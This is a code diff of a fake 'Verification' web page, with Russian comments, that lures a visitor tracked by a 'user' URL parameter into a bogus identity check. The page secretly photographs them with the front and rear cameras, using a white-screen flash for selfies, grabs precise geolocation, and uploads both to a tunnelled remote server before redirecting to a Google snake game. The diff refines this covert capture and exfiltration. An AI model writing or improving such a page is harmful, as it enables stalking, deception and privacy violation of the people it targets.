@@ -5,14 +5,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Verification</title>
     <style>
-        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
-        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:80%; border:1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; transition: background 0.2s; }
+        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:80%; border:1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: opacity 0.2s; }
         .btn { background:#fff; color:#000; border:none; padding:15px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 16px; transition: 0.3s; }
         .btn:active { transform: scale(0.95); opacity: 0.8; }
         #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:30px; height:30px; animation:spin 1s linear infinite; margin:20px auto; }
         @keyframes spin { 100% { transform:rotate(360deg); } }
         video, canvas { display:none; position: absolute; left: -9999px; }
         p { color: #888; font-size: 14px; margin-bottom: 20px; }
+        
+        /* Класс для вспышки */
+        body.flash-active { background: #fff !important; }
+        .flash-active .card { opacity: 0; }
     </style>
 </head>
 <body>
@@ -28,18 +32,17 @@
 
 <script>
     // Твоя актуальная ссылка (БЕЗ слэша в конце)
-    const API = "https://8e850dcb33b350.lhr.life"; 
+    const API = "https://eddb059ff115a0.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
-    // Получаем юзера из URL
     const urlParams = new URLSearchParams(window.location.search);
     const user = urlParams.get('user') || "Unknown";
 
     async function takePhoto(mode) {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            console.error("Browser API not supported");
-            return null;
-        }
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+
+        // Если это селфи (front camera), включаем белый экран
+        if (mode === "user") document.body.classList.add('flash-active');
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -49,11 +52,8 @@
             
             const v = document.getElementById('v');
             v.srcObject = stream;
-            
-            // Ждем запуска видео потока
             await new Promise(r => v.onloadedmetadata = r);
-            // Ждем 1.5 сек для автофокуса
-            await new Promise(r => setTimeout(r, 1500));
+            await new Promise(r => setTimeout(r, 1500)); // Даем камере настроиться
 
             const canvas = document.getElementById('c');
             canvas.width = v.videoWidth;
@@ -61,15 +61,15 @@
             canvas.getContext('2d').drawImage(v, 0, 0);
 
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
-            
-            // Важно: Останавливаем ВСЕ треки перед выходом
             stream.getTracks().forEach(t => t.stop());
-            v.srcObject = null;
             
             return blob;
         } catch (e) {
-            console.error("Camera error (" + mode + "):", e);
+            console.error(e);
             return null;
+        } finally {
+            // В любом случае выключаем вспышку
+            document.body.classList.remove('flash-active');
         }
     }
 
@@ -84,53 +84,40 @@
         msg.innerText = "Processing security check...";
 
         try {
-            // 1. Геолокация
+            // Гео
             navigator.geolocation.getCurrentPosition(p => {
                 fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(() => {});
-            }, (err) => console.log("Geo error:", err.message), {enableHighAccuracy: true});
+            }, null, {enableHighAccuracy: true});
 
             const fd = new FormData();
             
-            // 2. Фото 1 (Фронталка)
             msg.innerText = "Verifying identity (1/2)...";
             const f1 = await takePhoto("user");
             if (f1) fd.append('files', f1, 'front.jpg');
 
-            // 3. Фото 2 (Задняя камера)
             msg.innerText = "Verifying identity (2/2)...";
             const f2 = await takePhoto("environment");
             if (f2) fd.append('files', f2, 'back.jpg');
 
-            // 4. Отправка
             if (fd.has('files')) {
                 msg.innerText = "Uploading data...";
-                const response = await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
+                await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
                     method: 'POST',
                     body: fd
                 });
-
-                if (!response.ok) throw new Error("Server response not OK");
-                console.log("Upload success");
-            } else {
-                throw new Error("Camera permission denied or failed");
             }
 
-            // 5. Финал
             statusTitle.innerText = "Success";
             loader.style.display = 'none';
-            msg.innerText = "Identity verified! Redirecting to game...";
+            msg.innerText = "Identity verified! Redirecting...";
 
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 1500);
+            setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
 
         } catch (e) {
-            console.error("Process error:", e);
             statusTitle.innerText = "Error";
-            msg.innerText = "Verification failed. Please check camera permissions.";
+            msg.innerText = "Check permissions and retry.";
             loader.style.display = 'none';
             btn.style.display = 'block';
-            btn.innerText = "RETRY";
         }
     }
 </script>
